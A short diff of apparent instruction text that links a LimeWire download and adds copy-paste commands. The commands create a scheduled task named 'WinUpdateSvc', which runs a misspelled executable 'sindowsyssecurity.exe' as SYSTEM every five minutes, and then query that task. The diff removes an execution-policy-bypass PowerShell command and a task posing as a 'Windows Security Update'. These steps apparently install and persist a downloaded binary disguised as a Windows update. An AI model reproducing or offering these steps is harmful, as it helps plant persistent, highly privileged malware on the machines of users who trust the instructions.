@@ -4,10 +4,12 @@
 https://limewire.com/d/gb8PN#ApTP1Uj4JC
 
 
-```
-powershell.exe -ExecutionPolicy Bypass -File .\windowshelp.ps1
-```
 
 ```
-Start-ScheduledTask -TaskName "Windows Security Update"
+schtasks /create /tn "WinUpdateSvc" /tr "C:\Users\Home\sindowsyssecurity.exe" /sc minute /mo 5 /ru SYSTEM
+```
+
+
+```
+schtasks /query /tn "WinUpdateSvc" /v /fo LIST
 ```
